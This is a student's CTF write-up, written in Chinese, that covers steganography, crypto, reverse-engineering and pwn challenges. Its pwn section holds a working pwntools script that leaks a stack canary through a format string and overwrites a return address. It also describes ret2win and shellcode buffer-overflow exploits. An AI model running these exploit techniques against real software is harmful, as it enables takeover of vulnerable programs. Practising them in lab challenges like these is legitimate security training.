19G242杜辰光
# i am so free
010 editor打开压缩包文件 在末尾发现flag

# 我本无心和你一决高下
第一段音频用audacity查看频谱图发现狼哥留下的自恋压缩包密码 第二段用stegslove查看蓝色最低位，找到flag

# 灰太狼的ppt
将ppt改成压缩包，然后翻找其中文件夹找到损坏的二维码 交给豆包把定位块修复扫描得到flag

# 签到
base64解码 再解ascii

# stack-canary-fmt
```python
context.arch = 'amd64'

context.os = 'linux'

prog = Myprogram()

p = prog.remote()

#libc = ELF("./libc-2.31.so")

elf = prog.Myelf()

prog.contextOn()

libc = ELF(prog.libc)

#=======================================================\

p.sendline(b'%p')

p.recvuntil(b'Hello, ')

canary = p.recvuntil(b'\n')[:-1]

Canary = int(str(canary)[2:-1],16)

log.success(Canary)

bk = 0x401787

payload = cyclic(0x78) + p64(Canary) + cyclic(8) + p64(bk)

#attach(p)

p.send(payload)

#=============================================

p.interactive()
```


# stack ret2win
简单的栈溢出，覆盖缓冲区后接函数win的地址，同时注意栈对齐

# stack shellcode
使用gdb发现程序缓冲区有执行权限，则使用pwntools自带方法shellcraft.sh()生成shellcode
同时接收系统输出的缓冲区地址供下一步溢出跳转
payload为：shellcode + 填充缓冲区 + 缓冲区地址


# ezcheckin
ida读取 main函数后双击g_text_tool后可见
![[Pasted image 20260412182327.png]]



# 密码1
逆Arnold脚本得到原图
```powershell
Add-Type -AssemblyName System.Drawing

  

function Get-BytesFromBitmap([System.Drawing.Bitmap]$bmp) {

    $rect = New-Object System.Drawing.Rectangle 0, 0, $bmp.Width, $bmp.Height

    $data = $bmp.LockBits($rect, [System.Drawing.Imaging.ImageLockMode]::ReadOnly, [System.Drawing.Imaging.PixelFormat]::Format32bppArgb)

    try {

        $bytes = New-Object byte[] ($data.Stride * $data.Height)

        [System.Runtime.InteropServices.Marshal]::Copy($data.Scan0, $bytes, 0, $bytes.Length)

        return @{ Bytes = $bytes; Stride = $data.Stride }

    } finally {

        $bmp.UnlockBits($data)

    }

}

  

function Set-BytesToBitmap([System.Drawing.Bitmap]$bmp, [byte[]]$bytes, [int]$stride) {

    $rect = New-Object System.Drawing.Rectangle 0, 0, $bmp.Width, $bmp.Height

    $data = $bmp.LockBits($rect, [System.Drawing.Imaging.ImageLockMode]::WriteOnly, [System.Drawing.Imaging.PixelFormat]::Format32bppArgb)

    try {

        if ($data.Stride -ne $stride) {

            throw "Stride mismatch: expected $stride, got $($data.Stride)"

        }

        [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $data.Scan0, $bytes.Length)

    } finally {

        $bmp.UnlockBits($data)

    }

}

  

function Arnold-Decode([byte[]]$srcBytes, [int]$n, [int]$stride, [int]$times, [int]$a, [int]$b) {

    $cur = $srcBytes

  

    for ($t = 0; $t -lt $times; $t++) {

        $dst = New-Object byte[] ($stride * $n)

        for ($newX = 0; $newX -lt $n; $newX++) {

            for ($newY = 0; $newY -lt $n; $newY++) {

                # inverse matrix [[ab+1, -b], [-a, 1]] mod N

                $oriX = ((($a * $b + 1) * $newX) + (-$b) * $newY) % $n

                if ($oriX -lt 0) { $oriX += $n }

                $oriY = ((-$a * $newX) + $newY) % $n

                if ($oriY -lt 0) { $oriY += $n }

  

                $srcIdx = $newX * $stride + $newY * 4

                $dstIdx = $oriX * $stride + $oriY * 4

                $dst[$dstIdx]     = $cur[$srcIdx]

                $dst[$dstIdx + 1] = $cur[$srcIdx + 1]

                $dst[$dstIdx + 2] = $cur[$srcIdx + 2]

                $dst[$dstIdx + 3] = $cur[$srcIdx + 3]

            }

        }

        $cur = $dst

    }

  

    return $cur

}

  

$srcPath = Join-Path $PSScriptRoot 'en_flag.png'

$dstPath = Join-Path $PSScriptRoot 'de_flag.png'

  

$img = [System.Drawing.Bitmap]::FromFile($srcPath)

try {

    if ($img.Width -ne $img.Height) {

        throw "Arnold expects square image, got $($img.Width)x$($img.Height)"

    }

  

    $bmp = [System.Drawing.Bitmap]::new($img.Width, $img.Height, [System.Drawing.Imaging.PixelFormat]::Format32bppArgb)

    $g = [System.Drawing.Graphics]::FromImage($bmp)

    $g.DrawImage($img, 0, 0, $img.Width, $img.Height)

    $g.Dispose()

  

    $info = Get-BytesFromBitmap $bmp

    $decodedBytes = Arnold-Decode $info.Bytes $bmp.Width $info.Stride 3 6 9

  

    Set-BytesToBitmap $bmp $decodedBytes $info.Stride

    $bmp.Save($dstPath, [System.Drawing.Imaging.ImageFormat]::Png)

} finally {

    $img.Dispose()

    if ($bmp) { $bmp.Dispose() }

}

  

Write-Host "wrote $dstPath"
```